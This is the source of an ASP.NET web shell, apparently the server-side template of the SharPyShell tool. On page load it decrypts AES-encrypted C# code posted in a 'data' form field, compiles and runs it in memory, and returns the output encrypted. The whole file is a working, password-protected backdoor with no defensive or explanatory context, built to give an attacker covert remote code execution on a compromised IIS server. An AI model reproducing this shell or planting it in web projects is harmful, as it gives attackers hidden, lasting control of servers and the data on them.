<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<%@ Import Namespace="System.Security.Cryptography" %>

<script Language="c#" runat="server">

byte[] ConvertHexStringToByteArray(string hexString)
{
    byte[] data = new byte[hexString.Length / 2];
    for (int index = 0; index < data.Length; index++)
    {
        string byteValue = hexString.Substring(index * 2, 2);
        data[index] = byte.Parse(byteValue, System.Globalization.NumberStyles.HexNumber);
    }
    return data; 
}

byte[] AESEnc(byte[] plain, byte[] Key, byte[] IV)
{
	byte[] encrypted;
	using (Rijndael rijAlg = Rijndael.Create())
	{
		rijAlg.Key = Key;
		rijAlg.IV = IV;
		ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
		using (MemoryStream msEncrypt = new MemoryStream())
		{
			using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
			{
				csEncrypt.Write(plain, 0, plain.Length);
				
			}
		encrypted = msEncrypt.ToArray();
		}
	}
	return encrypted;
}

byte[] AESDec(byte[] encrypted, byte[] Key, byte[] IV)
{
	byte[] plain;
	using (Rijndael rijAlg = Rijndael.Create())
	{
		rijAlg.Key = Key;
		rijAlg.IV = IV;
		ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
		using (MemoryStream msDecrypt = new MemoryStream(encrypted))
		{
			using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
			{
				using (StreamReader srDecrypt = new StreamReader(csDecrypt))
				{
					string sf = srDecrypt.ReadToEnd();
					plain = Encoding.UTF8.GetBytes(sf);
				}
			}
		}

	}
	return plain;
}

void Page_Load(object sender, EventArgs e)
{
	string password="{{SharPyShell_Placeholder_pwd}}";
	byte[] Key=ConvertHexStringToByteArray(password);
	byte[] IV= new byte[16];
	System.Array.Copy(Key, IV, 16);
	if(Request.Form["data"]!=null){
		byte[] decoded_request_byte=Convert.FromBase64String(Request.Form["data"]);
		byte[] runtime_code_byte=AESDec(decoded_request_byte, Key, IV);
		string runtime_code=Encoding.UTF8.GetString(runtime_code_byte);
		object runtime_exec_output = new object();
		CompilerResults results = null;
		try{
			CSharpCodeProvider provider = new CSharpCodeProvider();
			CompilerParameters compilerParams = new CompilerParameters();
			compilerParams.GenerateInMemory = true;
			compilerParams.GenerateExecutable = false;
			compilerParams.ReferencedAssemblies.Add("System.dll");
			results = provider.CompileAssemblyFromSource(compilerParams, runtime_code);
			object o = results.CompiledAssembly.CreateInstance("SharPyShell");
			MethodInfo mi = o.GetType().GetMethod("ExecRuntime");
			runtime_exec_output = mi.Invoke(o, null);
		}
		catch(Exception exc){
			string exc_out_str = exc.ToString()+"\n\n{{{SharPyShellError}}}";
			for( int i=0; i<results.Errors.Count; i++ )
				exc_out_str +=  i.ToString() + ": " + results.Errors[i].ToString();
			runtime_exec_output=Encoding.UTF8.GetBytes(exc_out_str);
			Response.Clear();
		}
		byte[] output_runtime_code_enc=AESEnc((byte[])(runtime_exec_output), Key, IV);
		string output_runtime_code_enc_b64=Convert.ToBase64String(output_runtime_code_enc);
		Response.Write(output_runtime_code_enc_b64);
	}
}

</script>
